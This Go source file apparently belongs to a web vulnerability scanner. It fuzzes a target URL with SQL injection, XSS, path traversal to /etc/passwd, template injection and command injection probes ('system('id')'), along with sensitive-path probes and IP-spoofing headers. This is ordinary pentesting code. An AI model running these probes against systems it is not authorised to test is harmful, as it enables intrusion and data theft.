package main

import (
	"fmt"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
)

type FuzzMode string

const (
	FuzzParam    FuzzMode = "parameter"
	FuzzPath     FuzzMode = "path"
	FuzzHeader   FuzzMode = "header"
)

type FuzzResult struct {
	URL        string
	Param      string
	Payload    string
	StatusCode int
	BodyLen    int
	Reflected  bool
	Error      string
}

func FuzzTarget(baseURL string, mode FuzzMode, threads int, recursive bool, client *http.Client) []FuzzResult {
	commonParams := []string{"id", "page", "file", "name", "q", "s", "search", "cmd", "exec", "url", "redirect", "next", "return", "path", "dir", "action", "view", "template", "include", "load", "read", "data", "debug"}
	commonPaths := []string{"/admin", "/api", "/login", "/register", "/upload", "/download", "/search", "/config", "/backup", "/test", "/debug", "/console", "/env", "/health", "/status", "/metrics", "/info", "/api/v1", "/api/v2", "/.git", "/.env", "/wp-admin", "/administrator"}
	payloads := []string{"'", "\"", "<script>alert(1)</script>", "1' OR '1'='1", "../../../etc/passwd", "${7*7}", "{{7*7}}", "<!--#exec cmd=\"id\"-->", "1 AND 1=1", "';system('id');'", "../../../../etc/passwd%00", "<img src=x onerror=alert(1)>"}

	var results []FuzzResult
	var mu sync.Mutex
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup
	var tested int32

	switch mode {
	case FuzzParam:
		for _, param := range commonParams {
			for _, pay := range payloads {
				wg.Add(1)
				sem <- struct{}{}
				go func(p, pay string) {
					defer wg.Done()
					defer func() { <-sem }()
					atomic.AddInt32(&tested, 1)
					u := baseURL + "?" + p + "=" + pay
					resp, err := SendRequest(client, u, "GET", "", nil)
					if err != nil { return }
					fr := FuzzResult{URL: u, Param: p, Payload: pay, StatusCode: resp.StatusCode, BodyLen: resp.BodyLen}
					if strings.Contains(resp.Body, pay) { fr.Reflected = true }
					mu.Lock()
					results = append(results, fr)
					mu.Unlock()
				}(param, pay)
			}
		}
	case FuzzPath:
		for _, path := range commonPaths {
			wg.Add(1)
			sem <- struct{}{}
			go func(path string) {
				defer wg.Done()
				defer func() { <-sem }()
				atomic.AddInt32(&tested, 1)
				u := baseURL + path
				resp, err := SendRequest(client, u, "GET", "", nil)
				if err != nil { return }
				fr := FuzzResult{URL: u, Param: "path", Payload: path, StatusCode: resp.StatusCode, BodyLen: resp.BodyLen}
				mu.Lock()
				results = append(results, fr)
				mu.Unlock()
				if recursive && resp.StatusCode == 200 {
					more := FuzzTarget(u, FuzzPath, threads, false, client)
					mu.Lock()
					results = append(results, more...)
					mu.Unlock()
				}
			}(path)
		}
	case FuzzHeader:
		headers := map[string]string{
			"X-Forwarded-For": "127.0.0.1",
			"X-Real-IP":       "127.0.0.1",
			"X-Originating-IP": "127.0.0.1",
			"X-Remote-IP":     "127.0.0.1",
			"X-Client-IP":     "127.0.0.1",
			"X-Host":          "localhost",
			"X-Forwarded-Host": "localhost",
		}
		for k, v := range headers {
			wg.Add(1)
			sem <- struct{}{}
			go func(k, v string) {
				defer wg.Done()
				defer func() { <-sem }()
				atomic.AddInt32(&tested, 1)
				resp, err := SendRequest(client, baseURL, "GET", "", map[string]string{k: v})
				if err != nil { return }
				fr := FuzzResult{URL: baseURL, Param: k, Payload: v, StatusCode: resp.StatusCode, BodyLen: resp.BodyLen}
				mu.Lock()
				results = append(results, fr)
				mu.Unlock()
			}(k, v)
		}
	}

	wg.Wait()
	close(sem)
	_ = tested
	return results
}

func PrintFuzzResults(results []FuzzResult) {
	if len(results) == 0 {
		fmt.Printf("\n%s No results from fuzzing.\n", SColor(ColorGreen, "[+]"))
		return
	}
	fmt.Printf("\n%s %s\n", SColor(ColorBCyan, "═══"), SColor(ColorBWhite, fmt.Sprintf("FUZZ RESULTS (%d tested)", len(results))))
	for _, r := range results {
		status := ColorStatus(r.StatusCode)
		reflected := ""
		if r.Reflected { reflected = SColor(ColorYellow, " [REFLECTED]") }
		fmt.Printf("  %s %s %s%s\n",
			status,
			SColor(ColorBWhite, r.URL),
			SColor(ColorDim, fmt.Sprintf("(%d bytes)", r.BodyLen)),
			reflected,
		)
	}
}
